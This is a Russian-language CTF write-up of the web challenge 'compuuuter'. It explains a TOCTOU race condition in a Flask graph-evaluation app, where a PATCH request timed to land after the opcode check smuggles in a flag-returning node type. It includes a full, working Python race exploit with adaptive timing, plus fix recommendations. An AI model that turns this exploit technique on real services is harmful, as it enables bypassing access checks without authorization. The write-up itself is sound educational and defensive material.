# compuuuter — writeup

> **Категория:** web, beginner · **Стоимость:** 100 pt · **Солверов:** 393
> **Описание:** *«I build a new scratch competitor»*
> **Файлы:** `compuuuter.zip` — Flask-приложение «графовый компьютер» (node-редактор в духе Scratch: блоки-операции, соединяешь проводами, жмёшь Run).

---

## TL;DR

Классический **TOCTOU**[^toctou]: `compute` в начале проверяет, что среди нод нет скрытого опкода `type=1337` (он возвращает флаг), но *после* проверки читает типы нод «вживую» из тех же самых dict-объектов. Эндпоинт `PATCH /api/graph/<gid>` этот опкод **не проверяет** и правит ноды in-place. Сервер — `gunicorn -w 1 --threads 8`, т.е. запросы реально идут параллельно в одном процессе. Схема атаки:

1. Залить граф из тысяч нод, целевая нода — последняя в списке.
2. Запустить `compute` и через ~50–200 мс отправить `PATCH {"type": 1337}` по целевой ноде.
3. Guard уже прошёл, evaluate читает уже подменённый тип → в `results` приезжает флаг в виде little-endian[^le] целого числа.
4. `int(s).to_bytes(..., "little").decode()` → флаг.

```text
$ python3 compuuuter_sol.py https://<instance>/
[+] instance is up (GET /api/ops round-trip 87 ms)
[*] uploading graph: ~19867 nodes, 828 KB ...
[+] warmup compute: 0.42s -> starting delay 0.147s
[+] race won on attempt 3 (delay=0.118s)
[+] FLAG: ctfcup{...}          # <- ваш флаг с инстанса
```

---

## Дано

Приложение моделирует dataflow-граф: нода = `{id, type, args[]}`, где `type` — номер операции, `args` — id нод-источников. Публичные операции — арифметика и битовая логика:

| type | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 |
|---|---|---|---|---|---|---|---|---|---|---|
| op | const | add | sub | mul | xor | and | or | shl | shr | mod |

Плюс **скрытый опкод** `T_FLAG = 1337`: при вычислении возвращает `FLAG_INT = int.from_bytes(FLAG.encode(), "little")` — флаг, упакованный в целое число.

API:

| Метод | Путь | Что делает |
|---|---|---|
| `POST` | `/api/graph` | залить граф (с проверкой на 1337) |
| `PATCH` | `/api/graph/<gid>` | точечно править/добавлять ноду (**без** проверки) |
| `POST` | `/api/graph/<gid>/compute` | вычислить граф (**с** проверкой в начале) |
| `GET` | `/api/graph/<gid>` | результаты последнего compute |

---

## Разбор уязвимости

Автор сам всё рассказал в комментариях — надо лишь собрать три куска вместе.

**1. Проверка — только в начале compute.** `app.py`:

```python
def compute(nodes):
    # TIME OF CHECK: the flag opcode must be absent.
    guard(nodes)
    ...
    def evaluate(nid, stack):
        ...
        # TIME OF USE: node fields are read here, live.
        t = node["type"]
        if t == T_FLAG:
            val = FLAG_INT
```

`guard()` проходит по списку нод и отвергает `1337`. Но `evaluate` читает `node["type"]` **позже и заново** — из того же мутабельного dict. Между CHECK и USE — окно, в котором состояние ноды можно поменять.

**2. PATCH мутирует ноды in-place и ничего не проверяет.**

```python
        patch = parse_node(body)  # a quick edit -- no flag-opcode check here
    ...
    for node in nodes:
        if node["id"] == patch["id"]:
            node["type"] = patch["type"]   # тот же самый dict-объект!
```

Патч не создаёт новую ноду — он переписывает поля существующего dict. Того самого, на который держит ссылку `nmap` внутри запущенного в соседнем потоке compute.

**3. Запросы параллельны.** `Dockerfile`:

```dockerfile
# Single worker so the in-memory graph store is shared across requests.
CMD ["gunicorn", "-w", "1", "--threads", "8", "-b", "0.0.0.0:3000", "app:app"]
```

Один воркер — графы общие (иначе race был бы бессмысленным), 8 потоков — PATCH спокойно исполняется, пока compute считает. `GRAPHS_LOCK` защищает только словарь `GRAPHS` при регистрации; сам `compute()` идёт вне локa.

Итого: проверка и использование разнесены во времени, а состояние между ними мутируется из другого потока. Осталось сделать окно побольше и попасть в него.

---

## Эксплойт

### Расширяем окно

Тело compute после guard'а: строит `nmap` (O(N)), затем цикл `for node in nodes: results[str(id)] = str(evaluate(...))` — ноды вычисляются **в порядке списка**. Значит:

* **целевую ноду ставим последней** — её тип читается после всех наполнителей;
* **наполнители делаем «тяжёлыми»**: цепочки из `add`-нод (depth = 300), причём голова цепочки стоит в списке раньше хвоста. Первый обход цепочки — глубокая рекурсия, где на каждом уровне растёт frozenset[^fs] `stack = stack | {key}`: копирование множителя даёт O(depth²) работы на цепочку. Тысяча нод-констант считается за 0.02 с, а такой граф — на порядок дольше. Окно вырастает до ~0.2–0.3 с — его уже не страшно ловить через интернет.

```python
def build_graph(n_filler):
    chains = max(1, n_filler // (DEPTH + 1))          # DEPTH = 300
    nodes = []
    for c in range(chains):
        base = c * 1000
        nodes.append({"id": base + DEPTH, "type": 2, "args": [base + DEPTH - 1]})  # голова первой
        for d in range(DEPTH - 1):
            nodes.append({"id": base + d + 1, "type": 2, "args": [base + d]})
        nodes.append({"id": base, "type": 1, "value": 0, "args": []})
    nodes.append({"id": TARGET_ID, "type": 1, "value": 0, "args": []})             # цель — последняя
    return {"nodes": nodes}
```

### Попадаем в окно

Попытка = «compute в отдельном потоке + PATCH через delay секунд». Исход подсказывает, куда крутить delay:

| Ответ compute | Что случилось | Действие |
|---|---|---|
| `400 the flag operation (type 1337)...` | PATCH пришёл **раньше** guard'а | увеличить delay |
| `200`, у цели обычный результат | PATCH пришёл **после** чтения типа | уменьшить delay |
| `200`, у цели гигантский int | **победа** | декодировать |

Когда обе границы встречались — бисекция `(lo + hi) / 2`. Стартовую задержку даёт прогрев: один чистый compute, `delay = 0.35 × время`. Мелочи, которые сильно помогли на реальном инстансе: keep-alive[^ka]-соединения (PATCH улетает без TLS-хендшейка), нода-цель с id `10**9` (не пересечётся с наполнителями), после каждой попытки PATCH возвращает цели `type=1`.

### Декод флага

```python
n = int(results[str(TARGET_ID)])                    # ~10^88, строкой из JSON
flag = n.to_bytes((n.bit_length() + 7) // 8, "little").decode()
```

---

## Гонка в цифрах

Все замеры — локальный запуск челленджа (Flask dev server), кроме отмеченного:

| Замер | Результат |
|---|---|
| compute 20k нод-констант | **0.02 с** — окно микроскопическое, гонка почти не ловится |
| compute 90k нод-констант | **0.14 с** — лучше, но всё ещё мало |
| compute 95 381 нода (380 цепочек × 250) | **0.31 с** — окно ~0.2–0.3 с, рабочая ширина |
| PATCH на +31 мс после старта compute | `400` от guard — слишком рано, guard ещё идёт по списку |
| PATCH на +50 мс (после прогрева, 19 867 нод) | победа с **первой попытки** |
| прогрев: compute 19 867 нод (66×300+1) | 0.09 с → стартовый delay = 0.35 × 0.09 = 0.05 с |
| аплоад 100 001 ноды | `400 too many nodes (max 100000)` — `MAX_NODES` учитывает и цель! |
| **удалённый инстанс**, аплоад ~4.5 МБ (95k нод) | `TimeoutError: The write operation timed out` |
| **удалённый инстанс**, аплоад 828 КБ (66×300) | проходит, структура окна та же |

Два практических вывода. Первый: ширина окна ≈ время вычисления наполнителей, поэтому цепочки глубиной 300 выгоднее плоского моря констант при том же числе нод (и меньшем теле запроса). Второй: у прокси/платформы есть лимит на тело запроса — эксплойт поэтому стартует с ~20k нод и автоматически делит бюджет пополам при транспортной ошибке или `413`.

Таймлайн попытки:

```text
compute : [ guard: нет 1337? ][ nmap ][ evaluate цепочек... ][ цель ][ results->JSON ]
PATCH   :                ▲ окно: guard прошёл, тип цели ещё не читан ▲
```

---

## Редхерринг: `hash(n) == n % (2**61 − 1)`

В коде лежит подозрительный магнит для излишне умных:

```python
# Dockerfile: Needs 64-bit CPython: hash(n) == n % (2**61 - 1) for non-negative ints.
assert sys.hash_info.modulus == 2 ** 61 - 1, "run me on 64-bit CPython"
```

Идея-ловушка: id нод — целые произвольной длины, значит существуют **разные** id с **одинаковым** hash (отличающиеся ровно на 2⁶¹−1). Хочется сыграть на внутренностях dict/frozenset: подсунуть в `nmap`, `memo` или детектор циклов (`key in stack`) ключ-двойник.

Почему это тупик (наш разбор):

* dict (`nmap`, `memo`) и frozenset после совпадения hash **всегда сверяют равенство** — двойники остаются разными элементами, коллизия ничего не подменяет;
* «псевдо-цикл» через двойника детектор тоже ловит: `key in stack` сравнивает по равенству, а реального выигрыша цикл не даёт — флаг вернёт только `t == T_FLAG` внутри evaluate;
* главное: все ноды `nmap` приходят из того же списка, который прошёл `guard()`. Пока граф статичен, тип 1337 не проскочит проверку нигде.

Так что hash-магия — атмосфера и защита от не-64-битных платформ, а ключ к задаче один: мутация **между** проверкой и использованием. (Не исключаю, что в хардкорной версии челленджа коллизии станут основным путём — тут они скорее приманка.)

---

## Как чинить (заметки для автора)

1. **Валидировать `type` в PATCH** — очевидная дыра: `parse_node` без `guard()`. Одна строка закрывает и эту, и половину гонки.
2. **Перепроверять при использовании**: в `evaluate` после `t = node["type"]` — `if t == T_FLAG: raise`. Пусть CHECK и USE совпадают в одной точке, тогда гонка бессмысленна.
3. **Иммутабельность**: compute работает со снапшотом графа (copy-on-write: PATCH порождает новую версию списка вместо правки dict in-place). Классика для шаренного состояния.
4. **Лок на всё вычисление** — грубо, но тоже работает: `GRAPHS_LOCK` вокруг compute+patch убивает параллельность вовсе.

Минимально достаточный фикс — пункты 1+2; красивый — 3.

---

## Артефакты

Эксплойт целиком — в спойлере ниже и в файле `compuuuter_sol.py`. Запуск:

```bash
python3 compuuuter_sol.py https://<instance>/
# тюнинг: NODES=15000 (мельче аплоад), ATTEMPTS=30 (больше попыток)
```

<details>
<summary><b>Полный листинг compuuuter_sol.py</b></summary>

```python
#!/usr/bin/env python3
"""
compuuuter (web, beginner) -- TOCTOU race exploit (remote-friendly version).

Vuln chain:
  1) POST /api/graph/<gid>/compute first calls guard() -- "time of check",
     it walks the node list and rejects type 1337.
  2) Then evaluate() reads node["type"] LIVE from the very same dict
     objects -- "time of use" (the code even says so in a comment).
  3) PATCH /api/graph/<gid> does NOT re-check the opcode and edits the
     node dict in place.
  4) Server runs gunicorn -w 1 --threads 8 => our PATCH lands in another
     thread while compute is between check and use.

Remote-friendly bits:
  * persistent keep-alive connections (no TLS handshake on the race PATCH)
  * upload starts small (~1 MB) and halves on transport errors / 413
  * a warmup compute measures server timing to pick the first delay
  * adaptive delay: guard 400 => too early (raise), clean run => too late
    (lower); once bracketed, bisect.

Env overrides: NODES (filler nodes, default 20000), ATTEMPTS (default 15).
Usage: python3 compuuuter_sol.py https://host[:port]/
"""

import http.client
import json
import os
import sys
import threading
import time
from urllib.parse import urlparse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000").rstrip("/")
NODES = int(os.environ.get("NODES", "20000"))   # filler budget (max 100_000)
ATTEMPTS = int(os.environ.get("ATTEMPTS", "15"))
DEPTH = 300                                     # chain depth (recursion-safe)
TARGET_ID = 10 ** 9
BIG = 1 << 200                                  # flag int is way larger

U = urlparse(BASE)
IS_TLS = U.scheme == "https"
HOST = U.netloc


class Api:
    """One keep-alive connection; recreates itself on any transport error."""

    def __init__(self, name):
        self.name = name
        self.c = None

    def connect(self, timeout=30):
        self.close()
        cls = http.client.HTTPSConnection if IS_TLS else http.client.HTTPConnection
        self.c = cls(HOST, timeout=timeout)
        self.c.connect()
        return self

    def close(self):
        if self.c is not None:
            try:
                self.c.close()
            except Exception:
                pass
        self.c = None

    def req(self, method, path, body=None, timeout=60):
        data = json.dumps(body).encode() if body is not None else None
        headers = {"Content-Type": "application/json"} if data else {}
        try:
            if self.c is None:
                self.connect(timeout)
            self.c.request(method, path, body=data, headers=headers)
            resp = self.c.getresponse()
            raw = resp.read()
            try:
                return resp.status, json.loads(raw or b"null")
            except Exception:
                return resp.status, {"error": raw.decode(errors="replace")[:200]}
        except Exception as e:
            self.close()
            return -1, {"error": f"{type(e).__name__}: {e}"}


def build_graph(n_filler):
    """Chains of `add` nodes; each chain head goes FIRST in the list, so its
    first evaluation recurses down the whole chain with a growing frozenset
    `stack` -- O(depth^2) set copying that widens the race window. The target
    node goes LAST: the results loop reads its type after all the fillers."""
    chains = max(1, n_filler // (DEPTH + 1))
    nodes = []
    for c in range(chains):
        base = c * 1000
        nodes.append({"id": base + DEPTH, "type": 2, "args": [base + DEPTH - 1]})
        for d in range(DEPTH - 1):
            nodes.append({"id": base + d + 1, "type": 2, "args": [base + d]})
        nodes.append({"id": base, "type": 1, "value": 0, "args": []})
    nodes.append({"id": TARGET_ID, "type": 1, "value": 0, "args": []})
    return {"nodes": nodes}


def decode_flag(int_str):
    n = int(int_str)
    return n.to_bytes((n.bit_length() + 7) // 8, "little").decode(errors="replace")


def upload(api):
    """Upload with adaptive size: halve the filler budget on transport
    errors or 413/400 rejections (proxies often cap request bodies)."""
    budget = NODES
    while budget >= 2000:
        payload = build_graph(budget)
        size_kb = len(json.dumps(payload)) // 1024
        print(f"[*] uploading graph: ~{len(payload['nodes'])} nodes, {size_kb} KB ...", flush=True)
        st, body = api.req("POST", "/api/graph", payload, timeout=120)
        if st == 200:
            print(f"[+] uploaded: gid={body['id']} ({body['node_count']} nodes)", flush=True)
            return body["id"]
        print(f"[!] upload failed: {st} {str(body)[:140]}", flush=True)
        budget //= 2
        print(f"[*] retrying with budget={budget} ...", flush=True)
    return None


def attempt(gid, delay, c_compute, c_patch):
    box = {}

    def run_compute():
        box["res"] = c_compute.req("POST", f"/api/graph/{gid}/compute", timeout=60)

    t = threading.Thread(target=run_compute, daemon=True)
    t0 = time.perf_counter()
    t.start()
    time.sleep(delay)
    c_patch.req("PATCH", f"/api/graph/{gid}", {"id": TARGET_ID, "type": 1337, "args": []}, timeout=30)
    t.join(timeout=45)
    landed = time.perf_counter() - t0
    # Restore the node so the next attempt can pass guard() again.
    c_patch.req("PATCH", f"/api/graph/{gid}", {"id": TARGET_ID, "type": 1, "value": 0, "args": []}, timeout=30)
    return box.get("res", (0, {})), landed


def main():
    print(f"[*] target: {BASE}", flush=True)

    health = Api("health")
    t0 = time.perf_counter()
    st, body = health.req("GET", "/api/ops", timeout=20)
    rtt = time.perf_counter() - t0
    if st != 200:
        print(f"[!] instance unreachable: {st} {str(body)[:200]}")
        return 1
    print(f"[+] instance is up (GET /api/ops round-trip {rtt*1000:.0f} ms)", flush=True)

    api = Api("main").connect(60)
    gid = upload(api)
    if gid is None:
        print("[!] could not upload any graph -- check the instance/size limits")
        return 1

    # Persistent pre-connected connections for the race itself.
    c_compute = Api("compute").connect(60)
    c_patch = Api("patch").connect(60)

    # Warmup: one clean compute to measure server timing for the first delay.
    t0 = time.perf_counter()
    st, body = c_compute.req("POST", f"/api/graph/{gid}/compute", timeout=60)
    warm = time.perf_counter() - t0
    if st != 200:
        print(f"[!] warmup compute failed: {st} {str(body)[:200]}")
        return 1
    delay = max(0.05, round(warm * 0.35, 3))
    print(f"[+] warmup compute: {warm:.2f}s -> starting delay {delay:.3f}s", flush=True)

    lo, hi = 0.0, None  # too-late bound, too-early bound
    for n in range(1, ATTEMPTS + 1):
        if hi is not None and delay >= hi:
            delay = max(0.02, (lo + hi) / 2)
        (status, body), landed = attempt(gid, delay, c_compute, c_patch)
        if status == 200:
            v = body.get("results", {}).get(str(TARGET_ID))
            if v and int(v) > BIG:
                print(f"[+] race won on attempt {n} (delay={delay:.3f}s)", flush=True)
                flag = decode_flag(v)
                print(f"[+] FLAG: {flag}")
                return 0
            print(f"[-] #{n}: too late (clean {landed:.2f}s)  delay {delay:.3f} ->", end=" ", flush=True)
            lo = max(lo, delay)
            delay = (lo + hi) / 2 if hi is not None else delay / 2
            print(f"{delay:.3f}", flush=True)
        elif status == 400 and "1337" in str(body.get("error", "")):
            print(f"[-] #{n}: too early (guard)      delay {delay:.3f} ->", end=" ", flush=True)
            hi = delay if hi is None else min(hi, delay)
            delay = max(0.02, (lo + hi) / 2 if lo > 0 else delay * 2)
            print(f"{delay:.3f}", flush=True)
        else:
            print(f"[-] #{n}: transport/other ({status}) {str(body)[:120]}", flush=True)
            c_compute.connect(60)
            c_patch.connect(60)
        time.sleep(0.3)
    print("[!] no luck -- rerun with more ATTEMPTS or tweak NODES")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

</details>

---

[^toctou]: **TOCTOU** (time-of-check to time-of-use) — классическая race condition: система проверяет условие в один момент, а использует результат проверки позже; между точками состояние успевает измениться, и проверка становится недействительной.

[^le]: **Little-endian** — порядок байтов «от младшего к старшему»: младший байт числа стоит первым. Именно поэтому `int.from_bytes(FLAG.encode(), "little")` можно обратить через `to_bytes(..., "little")`.

[^fs]: **frozenset** — неизменяемое множество в Python. Операция `stack | {key}` строит новое множество копированием старого — чем больше `stack`, тем дороже каждый уровень рекурсии; на этом и построено расширение окна.

[^ka]: **Keep-alive** — переиспользование одного TCP/TLS-соединения на несколько HTTP-запросов. Для гонки это критично: PATCH должен прилететь через миллисекунды после compute, а не через полный TLS-хендшейк.
